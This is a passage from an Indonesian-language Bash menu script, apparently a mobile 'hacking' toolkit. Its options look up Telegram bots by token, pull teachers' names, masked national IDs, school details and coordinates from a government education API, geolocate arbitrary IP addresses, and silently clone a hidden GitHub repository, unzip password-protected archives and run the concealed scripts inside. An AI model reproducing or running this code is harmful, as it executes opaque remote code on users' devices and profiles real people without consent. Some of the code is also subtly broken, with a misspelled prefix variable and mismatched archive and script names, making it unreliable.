IS_BOT=$(echo "$RESPONSE" | jq -r '.result.is_bot')
FIRST_NAME=$(echo "$RESPONSE" | jq -r '.result.first_name')
BIO=$(echo "$RESPONSE" | jq -r '.result.bio // "Tidak ada bio"')
LANGUAGE_CODE=$(echo "$RESPONSE" | jq -r '.result.language_code // "Tidak ada bahasa"')
CPU=$(getprop ro.product.cpu.abi)
echo -e "${r}=================================="
if [ -z "$USERNAME" ] || [ "$USERNAME" = "null" ]; then
    echo -e "${y}Username Bot Telegram ${c}: ${r}Botz telah dihapus."
else
    echo -e "${y}Username Botz Telegram ${c}: ${g}@$USERNAME"
    echo -e "${y}ID Botz Telegram ${c}: ${g}$BOT_ID"
    echo -e "${y}Status Botz ${c}: ${g}$( [ "$IS_BOT" = "true" ] && echo "Ya" || echo "Tidak" )"
    echo -e "${y}Nama Botz ${c}: ${g}$FIRST_NAME"
    echo -e "${y}Bio Botz ${c}: ${g}$BIO"
    echo -e "${y}Kode Bahasa ${c}: ${g}$LANGUAGE_CODE"
fi
echo -e "${y}Distro CPU ${c}: ${g}$CPU"
echo -e "${r}=================================="
}
get_info() {
clear
echo -e "${g}"
figlet Cek-User
echo "Development : By.Thxyzz404" | lolcat
echo -e "${c}"
read -p "Masukkan token botz : " ken
while true; do
    echo -e "${y}"
    read -p "Masukkan id botz : " id 
    echo -e "${g}"
    res=$(curl -s "https://api.telegram.org/bot${ken}/getChat?chat_id=${id}")    
    echo "=================================="
    echo "ID : $(echo "$res" | grep -o '"id":[0-9]*' | cut -d':' -f2)"
    echo "Nama Depan : $(echo "$res" | grep -o '"first_name":"[^"]*"' | cut -d'"' -f4)"
    echo "Username : $(echo "$res" | grep -o '"username":"[^"]*"' | cut -d'"' -f4)"
    echo "Tipe : $(echo "$res" | grep -o '"type":"[^"]*"' | cut -d'"' -f4)"
    echo "=================================="
    echo -e "${y}"  
    read -p "Apakah ingin mengecek lagi? y/n : " lag
    [[ "$lag" != "y" ]] && break
done
}
about() {
echo -e "${g} Thanks you by.thxyzz404"
echo ""
}
start() {
    clear
    mek
    echo ""
    read -p "$(echo -e "${b}Choose${c} :${g} ")" choose
    echo ""
    case "$choose" in
        1|01) get_bot ;;
        2|02) get_info ;;
        0|00) about ;;
        *) echo -e "${r}Invalid__Option..!!${n}" ;;
    esac
    echo ""
}
start
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      43)
            echo ""
            mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
            echo -e "${c} Anda Memilih Menu Hacking..!!"
            echo ""
            echo -e "${r} VIP UNLOCK..!!"
            sleep 2
            clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
██████╗ ████████╗██╗  ██╗    
██╔══██╗╚══██╔══╝██║ ██╔╝    
██████╔╝   ██║   █████╔╝     
██╔═══╝    ██║   ██╔═██╗     
██║        ██║   ██║  ██╗    
╚═╝        ╚═╝   ╚═╝  ╚═╝ " | lolcat 
echo ""
read -p "$(echo -e "${y}Masukkan target ${r}[ ${g}Usr/Nik/Nuptk ${r}]${c} : ")" cok
echo ""
if [ -z "$cok" ]; then
    clear 
    echo ""
    echo -e "${r} Yg anda masukkan tidak valid."
fi
echo -e "${r}[ ${g}+ ${r}]${c} Proses..!!"
echo -e "${g}"
res=$(curl -s "https://gtk.belajar.kemendikdasmen.go.id/akun/ptk-solr?keyword=${cok}" -H 'User-Agent: Mozilla/5.0' 2>/dev/null)
if [ -z "$res" ]; then
    clear 
    echo ""
    echo -e "${r} Username tidak di temukan."
fi
raw="$res"
echo "$res" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)    
    if not data.get('data'):
        print('Data Tidak Ditemukan.')
        sys.exit(1)    
    for ptk in data['data']:
        status_ptk = ptk.get('status_ptk')
        status = status_ptk.get('aktif') if status_ptk and isinstance(status_ptk, dict) else 'Tidak tersedia'
        if status == 'Aktif':
            nama = ptk.get('nama') if ptk.get('nama') else 'Tidak tersedia'
            nuptk = ptk.get('nuptk') if ptk.get('nuptk') else 'Tidak tersedia'
            nik_masked = ptk.get('nik_masked') if ptk.get('nik_masked') else 'Tidak tersedia'
            sekolah_obj = ptk.get('sekolah')
            if sekolah_obj and isinstance(sekolah_obj, dict):
                sekolah = sekolah_obj.get('nama') if sekolah_obj.get('nama') else 'Tidak tersedia'
                npsn = sekolah_obj.get('npsn') if sekolah_obj.get('npsn') else 'Tidak tersedia'
                daerah = sekolah_obj.get('daerah') if sekolah_obj.get('daerah') else 'Tidak tersedia'
                provinsi_obj = sekolah_obj.get('m_propinsi')
                if provinsi_obj and isinstance(provinsi_obj, dict):
                    provinsi = provinsi_obj.get('keterangan') if provinsi_obj.get('keterangan') else 'Tidak tersedia'
                else:
                    provinsi = 'Tidak tersedia'
                kota_obj = sekolah_obj.get('m_kota')
                if kota_obj and isinstance(kota_obj, dict):
                    kab_kota = kota_obj.get('keterangan') if kota_obj.get('keterangan') else 'Tidak tersedia'
                else:
                    kab_kota = 'Tidak tersedia'
            else:
                sekolah = 'Tidak tersedia'
                npsn = 'Tidak tersedia'
                daerah = 'Tidak tersedia'
                provinsi = 'Tidak tersedia'
                kab_kota = 'Tidak tersedia'
            ptk_sekolah = ptk.get('ptk_sekolah')
            if ptk_sekolah and isinstance(ptk_sekolah, dict):
                no_surat = ptk_sekolah.get('nomor_surat_tugas') if ptk_sekolah.get('nomor_surat_tugas') else 'Tidak tersedia'
                tgl_surat = ptk_sekolah.get('tanggal_surat_tugas') if ptk_sekolah.get('tanggal_surat_tugas') else 'Tidak tersedia'
                tmt_tugas = ptk_sekolah.get('tmt_tugas') if ptk_sekolah.get('tmt_tugas') else 'Tidak tersedia'
                keterangan = ptk_sekolah.get('keterangan') if ptk_sekolah.get('keterangan') else 'Tidak tersedia'
            else:
                no_surat = 'Tidak tersedia'
                tgl_surat = 'Tidak tersedia'
                tmt_tugas = 'Tidak tersedia'
            id_ptk = ptk.get('ptk_id') if ptk.get('ptk_id') else 'Tidak tersedia'
            id_dapodik = ptk.get('dapodik_ptk_id') if ptk.get('dapodik_ptk_id') else 'Tidak tersedia'
            wkt_sinkron = ptk.get('wkt_sinkron') if ptk.get('wkt_sinkron') else 'Tidak tersedia'
            wkt_terbit = ptk.get('wkt_terbit_akun') if ptk.get('wkt_terbit_akun') else 'Tidak tersedia'
            jenis_ptk_obj = ptk.get('m_jenis_ptk')
            if jenis_ptk_obj and isinstance(jenis_ptk_obj, dict):
                jenis_ptk = jenis_ptk_obj.get('jenis_ptk') if jenis_ptk_obj.get('jenis_ptk') else 'Tidak tersedia'
            else:
                jenis_ptk = 'Tidak tersedia'
            pegawai_obj = ptk.get('m_pegawai')
            if pegawai_obj and isinstance(pegawai_obj, dict):
                status_pegawai = pegawai_obj.get('keterangan') if pegawai_obj.get('keterangan') else 'Tidak tersedia'
            else:
                status_pegawai = 'Tidak tersedia'
            print(f\" [+] Nama           : {nama}\")
            print(f\" [+] NUPTK          : {nuptk}\")
            print(f\" [+] NIK            : {nik_masked}\")
            print(f\" [+] Status         : {status}\")
            print(f\" [+] Sekolah        : {sekolah}\")
            print(f\" [+] NPSN           : {npsn}\")
            print(f\" [+] Provinsi       : {provinsi}\")
            print(f\" [+] Kab/Kota       : {kab_kota}\")
            print(f\" [+] No Surat       : {no_surat}\")
            print(f\" [+] Tgl Surat      : {tgl_surat}\")
            print(f\" [+] ID PTK         : {id_ptk}\")
            print(f\" [+] ID Dapodik     : {id_dapodik}\")
            print(f\" [+] Wkt Sinkron    : {wkt_sinkron}\")
            print(f\" [+] Wkt Terbit     : {wkt_terbit}\")
            print(f\" [+] Jenis PTK      : {jenis_ptk}\")
            print(f\" [+] Pegawai        : {status_pegawai}\")
            break
except Exception as e:
    print(f'[-] Error: {str(e)}')
"
kelurahan=$(echo "$res" | grep -o '"kelurahan":"[^"]*"' | head -1 | cut -d'"' -f4)
if [ -n "$kelurahan" ] && [ "$kelurahan" != "null" ]; then
    echo " [+] Daerah         : $kelurahan"
else
    echo " [+] Daerah         : Tidak tersedia"
fi
pemilik=$(echo "$sekolah_obj" | sed -n 's/.*"pemilik"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
if [ -z "$pemilik" ]; then
    pemilik=$(echo "$raw" | sed -n 's/.*"pemilik"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
fi
if [ -z "$pemilik" ]; then
    pemilik=$(echo "$raw" | sed -n 's/.*"status_kepemilikan"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
fi
echo " [+] Jenis          : ${pemilik:-Tidak tersedia}"
longitude=$(echo "$raw" | grep -o '"sekolah":{"[^}]*"longitude":[^,}]*' | grep -o '"longitude":[^,}]*' | head -1 | sed 's/"longitude"://;s/"//g')
if [ -n "$longitude" ]; then
    echo " [+] Longitude      : $longitude"
else
    echo " [+] Longitude      : Tidak tersedia"
fi
latitude=$(echo "$raw" | grep -o '"sekolah":{"[^}]*"latitude":[^,}]*' | grep -o '"latitude":[^,}]*' | head -1 | sed 's/"latitude"://;s/"//g')
if [ -n "$latitude" ]; then
    echo " [+] Latitude       : $latitude"
else
    echo " [+] Latitude       : Tidak tersedia"
fi
alamat=$(echo "$raw" | grep -o '"sekolah":{"[^}]*"alamat":"[^"]*"' | grep -o '"alamat":"[^"]*"' | head -1 | sed 's/"alamat":"//;s/"//g')
if [ -n "$alamat" ]; then
    echo " [+] Alamat         : $alamat"
else
    echo " [+] Alamat         : Tidak tersedia"
fi
email=$(echo "$raw" | grep -o '"sekolah":{"[^}]*"email":"[^"]*"' | grep -o '"email":"[^"]*"' | head -1 | sed 's/"email":"//;s/"//g')
if [ -n "$email" ]; then
    echo " [+] Email          : $email"
else
    echo " [+] Email          : Tidak tersedia"
fi
kode_pos=$(echo "$raw" | grep -oP '"kode_pos":"\K[^"]+' | head -1)
if [ -n "$kode_pos" ]; then
    echo " [+] Kode Pos       : $kode_pos"
else
    echo " [+] Kode Pos       : Tidak tersedia"
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      44)
            echo ""
            mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
            echo -e "${c} Anda Memilih Menu Hacking..!!"
            echo ""
            echo -e "${r} VIP UNLOCK..!!"
            sleep 2
            clear
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.gtc_temp"
PEJU="Gtc.sh"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        chmod +x Gtc.sh
        bash "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        unzip -o -P "TAI_045_DEKODER_065_KONTOL" TAI.sh >/dev/null 2>&1 || kontol "Ada Maslah."
        chmod +x Gtc.sh
        bash "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    unzip -o -P "TAI_045_DEKODER_065_KONTOL" TAI.sh >/dev/null 2>&1 || kontol "Ada Maslah."
    chmod +x Gtc.sh
    bash "$PEJU" || kontol "Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      45)
            echo ""
            mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
            echo -e "${c} Anda Memilih Menu Hacking..!!"
            echo ""
            echo -e "${r} VIP UNLOCK..!!"
            sleep 2
            clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
░█▀█░█▀█░█▀▀░▀█▀░█▀█░█░░
░█▀▀░█░█░▀▀█░░█░░█▀█░█░░
░▀░░░▀▀▀░▀▀▀░░▀░░▀░▀░▀▀▀ " | lolcat 
echo -e "${y}"
read -p "Masukkan kode pos : " pos
if [ -z "$pos" ]; then
    clear 
    echo ""
    echo -e "${r} Kode pos tidak boleh kosong."
fi
if ! [[ "$pos" =~ ^[0-9]+$ ]]; then
    clear 
    echo ""
    echo -e "${r} Terjadi kesalahan."
fi
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Loading : $pos..!!"
echo ""
res=$(curl -s "https://kodepos.co.id/api/search?q=$pos")
if [ -z "$res" ] || [ "$res" = "null" ] || [ "$res" = "[]" ]; then
    clear 
    echo ""
    echo -e "${r} Kode pos tidak di temukan."
fi
echo -e "${r}================================="
echo -e "${g}        INFORMASI POSTAL "
echo -e "${r}================================="
kelurahan=$(echo "$res" | grep -o '"name":"[^"]*"' | cut -d'"' -f4)
parent=$(echo "$res" | grep -o '"parent":"[^"]*"' | cut -d'"' -f4)
kodepos=$(echo "$res" | grep -o '"kode_pos":"[^"]*"' | cut -d'"' -f4)
echo -e "${c}"
echo "Kelurahan : $kelurahan"
echo "Kecamatan : $(echo "$parent" | cut -d',' -f1 | xargs)"
echo "Kota : $(echo "$parent" | cut -d',' -f2 | xargs)"
echo "Provinsi : $(echo "$parent" | cut -d',' -f3 | xargs)"
echo "Kode Pos : $kodepos"
echo ""
echo -e "${r}================================="
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      46)
            echo ""
            mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
            echo -e "${c} Anda Memilih Menu Hacking..!!"
            echo ""
            echo -e "${r} VIP UNLOCK..!!"
            sleep 2
red='\033[0;31m'
hijau='\033[0;32m'
kuning='\033[0;33m'
biru='\033[0;34m'
purple='\033[0;35m'
cyan='\033[0;36m'
putih='\033[0;37m'
bgr='\033[41m'
bgh='\033[42m'
bgk='\033[43m'
bgb='\033[44m'
bgpurple='\033[45m'
bgc='\033[46m'
bgp='\033[47m'
banner() {
clear
echo "
░▀█▀░█▀▄░█▀█░█▀▀░█░█░█▀▀░█▀▄
░░█░░█▀▄░█▀█░█░░░█▀▄░█▀▀░█▀▄
░░▀░░▀░▀░▀░▀░▀▀▀░▀░▀░▀▀▀░▀░▀ " | lolcat
}
menu() {
printf "\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m 01 \e[0m\e[1;31m]\e[0m\e[1;33m IP ANDA\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m 02 \e[0m\e[1;31m]\e[0m\e[1;33m TRACK IP\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m 00 \e[0m\e[1;31m]\e[0m\e[1;33m KELUAR\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Select> \e[0m\e[1;96m: \e[0m\e[1;93m\en' option
if [[ $option == 1 || $option == 01 ]]; then
myipaddr
elif [[ $option == 2 || $option == 02 ]]; then
useripaddr
elif [[ $option == 0 || $option == 00 ]]; then
sleep 1
printf "\e[0m\n"
printf "\e[0m\n"
read -n 1 -s -r -p "Silahkan Tekan Enter Untuk Kluar"
clear
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Salah goblok \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
myipaddr() {
myipaddripapico=$(curl -s "https://ipapi.co//json" -L)
myipaddripapicom=$(curl -s "http://ip-api.com/json/" -L)
myip=$(echo $myipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
mycity=$(echo $myipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myregion=$(echo $myipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycountry=$(echo $myipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylat=$(echo $myipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylon=$(echo $myipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mytime=$(echo $myipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mypostal=$(echo $myipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myisp=$(echo $myipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myasn=$(echo $myipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycountrycode=$(echo $myipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycurrency=$(echo $myipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylanguage=$(echo $myipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycalling=$(echo $myipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Alamat Ip    \e[0m\e[1;96m:\e[0m\e[1;92m   $myip\e[0m\n"
printf "  \e[0m\e[1;93m  Kota         \e[0m\e[1;96m:\e[0m\e[1;92m   $mycity\e[0m\n"
printf "  \e[0m\e[1;93m  Wilayah      \e[0m\e[1;96m:\e[0m\e[1;92m   $myregion\e[0m\n"
printf "  \e[0m\e[1;93m  Negara       \e[0m\e[1;96m:\e[0m\e[1;92m   $mycountry\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Lintang      \e[0m\e[1;96m:\e[0m\e[1;92m    $mylat\e[0m\n"
printf "  \e[0m\e[1;93m  Bujur        \e[0m\e[1;96m:\e[0m\e[1;92m    $mylon\e[0m\n"
printf "  \e[0m\e[1;93m  Zona Waktu   \e[0m\e[1;96m:\e[0m\e[1;92m    $mytime\e[0m\n"
printf "  \e[0m\e[1;93m  Kode Pos     \e[0m\e[1;96m:\e[0m\e[1;92m    $mypostal\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  ISP          \e[0m\e[1;96m:\e[0m\e[1;92m   $myisp\e[0m\n"
printf "  \e[0m\e[1;93m  ASN          \e[0m\e[1;96m:\e[0m\e[1;92m   $myasn\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Kode Negara  \e[0m\e[1;96m:\e[0m\e[1;92m   $mycountrycode\e[0m\n"
printf "  \e[0m\e[1;93m  Mata Uang    \e[0m\e[1;96m:\e[0m\e[1;92m   $mycurrency\e[0m\n"
printf "  \e[0m\e[1;93m  Bahasa       \e[0m\e[1;96m:\e[0m\e[1;92m   $mylanguage\e[0m\n"
printf "  \e[0m\e[1;93m  Kode Panggil \e[0m\e[1;96m:\e[0m\e[1;92m   $mycalling\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Google Map   \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$mylat,$mylon\e[0m\n"
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Kembali\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Keluar\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31mSelect>\e[0m\e[1;96m  \en' mainorexit1
if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
banner
menu
elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
read -n 1 -s -r -p "Silahkan Tekan Enter Untuk Kluar...!!"
clear 
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Salah goblok \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
useripaddr() {
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Ip Target \e[0m\e[1;96m: \e[0m\e[1;93m\en' useripaddress
ipaddripapico=$(curl -s "https://ipapi.co/$useripaddress/json" -L)
ipaddripapicom=$(curl -s "http://ip-api.com/json/$useripaddress" -L)
userip=$(echo $ipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
usercity=$(echo $ipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
useregion=$(echo $ipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountry=$(echo $ipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlat=$(echo $ipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlon=$(echo $ipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usertime=$(echo $ipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userpostal=$(echo $ipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userasn=$(echo $ipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountrycode=$(echo $ipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercurrency=$(echo $ipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlanguage=$(echo $ipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  IP target       \e[0m\e[1;96m:\e[0m\e[1;92m   $userip\e[0m\n"
printf "  \e[0m\e[1;93m  Kota            \e[0m\e[1;96m:\e[0m\e[1;92m   $usercity\e[0m\n"
printf "  \e[0m\e[1;93m  Wilayah         \e[0m\e[1;96m:\e[0m\e[1;92m   $useregion\e[0m\n"
printf "  \e[0m\e[1;93m  Negara          \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountry\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Garis lintang   \e[0m\e[1;96m:\e[0m\e[1;92m    $userlat\e[0m\n"
printf "  \e[0m\e[1;93m  Bujur           \e[0m\e[1;96m:\e[0m\e[1;92m    $userlon\e[0m\n"
printf "  \e[0m\e[1;93m  Zona waktu      \e[0m\e[1;96m:\e[0m\e[1;92m    $usertime\e[0m\n"
printf "  \e[0m\e[1;93m  Kode pos        \e[0m\e[1;96m:\e[0m\e[1;92m    $userpostal\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  ISP             \e[0m\e[1;96m:\e[0m\e[1;92m   $userisp\e[0m\n"
printf "  \e[0m\e[1;93m  ASN             \e[0m\e[1;96m:\e[0m\e[1;92m   $userasn\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Kode negara     \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountrycode\e[0m\n"
printf "  \e[0m\e[1;93m  Mata Uang       \e[0m\e[1;96m:\e[0m\e[1;92m   $usercurrency\e[0m\n"
printf "  \e[0m\e[1;93m  Bahasa          \e[0m\e[1;96m:\e[0m\e[1;92m   $userlanguage\e[0m\n"
printf "  \e[0m\e[1;93m  Kode panggilan  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercalling\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Google map      \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$userlat,$userlon\e[0m\n"
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m 01 \e[0m\e[1;91m]\e[0m\e[1;93m Kembali\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m 02 \e[0m\e[1;91m]\e[0m\e[1;93m Keluar\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31mSelect>\e[0m\e[1;96m  \en' mainorexit2
if [[ $mainorexit2 == 1 || $mainorexit2 == 01 ]]; then
banner
menu
elif [[ $mainorexit2 == 2 || $mainorexit2 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Salah goblok \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
banner
menu
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      47)
            echo ""
            mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
            echo -e "${c} Anda Memilih Menu Hacking..!!"
            echo ""
            echo -e "${r} VIP UNLOCK..!!"
            sleep 2
            clear
install_pip_package() {
local pkg="$1"
if pip show "$pkg" >/dev/null 2>&1; then
     clear 
     echo ""
     echo -e "${r}[ ${g}✓ ${r}]${y} $pkg sudah terinstall."
     sleep 2
     echo ""
else
     clear 
     echo ""
     echo -e "${r}[ ${g}x ${r}]${c} $pkg sedang menginstall."
     sleep 2
     pip install "$pkg"
fi
}
install_pip_package "urllib3"
install_pip_package "bs4"
install_pip_package "requests"
install_pip_package "beautifulsoup4"
install_pip_package "phonenumbers"
install_pip_package "wcwidth"
install_pip_package "rich"
install_pip_package "pycryptodome"
install_pip_package "fake_useragent"
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.otp_temp"
PEJU="Wok.py"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        chmod +x Wok.py
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        unzip -o -P "Dancug_078_Dec_Asu_Tai" ZIP >/dev/null 2>&1 || kontol "Ada Maslah."
        chmod +x Wok.py
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
